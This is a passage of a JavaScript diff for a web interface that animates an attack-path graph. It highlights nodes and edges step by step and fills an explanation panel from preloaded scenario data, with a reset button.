+            const pathData = scenarios[selector.value].attackPath;
+            attackPath = [];
+            highlightedNodes.clear();
+            explPanel.innerHTML = '';
+            explPanel.style.display = 'block';
+            
+            let delay = 0;
+            
+            pathData.nodes.forEach((n, idx) => {
+                setTimeout(() => highlightedNodes.add(n), delay);
+                
+                if(idx < pathData.edges.length) {
+                    setTimeout(() => {
+                        attackPath.push(pathData.edges[idx]);
+                    }, delay + 200);
+                }
+                
+                if (pathData.steps[idx]) {
+                    setTimeout(() => {
+                        const step = pathData.steps[idx];
+                        const el = document.createElement('div');
+                        el.className = 'attack-step';
+                        el.innerHTML = `
+                            <div class="step-title"><i class="fas fa-skull"></i> ${step.title}</div>
+                            <div style="font-size:0.75rem; color:var(--cyan); margin-bottom:5px;">[Edge: ${step.edge}]</div>
+                            <div>${step.text}</div>
+                        `;
+                        explPanel.appendChild(el);
+                        explPanel.scrollTop = explPanel.scrollHeight;
+                    }, delay);
+                }
+
+                delay += 800;
+            });
+        });
+
+        btnReset.addEventListener('click', () => {
+            attackPath = [];
+            highlightedNodes.clear();
+            explPanel.style.display = 'none';
+            explPanel.innerHTML = '';
+        });
     }
 });
 })();
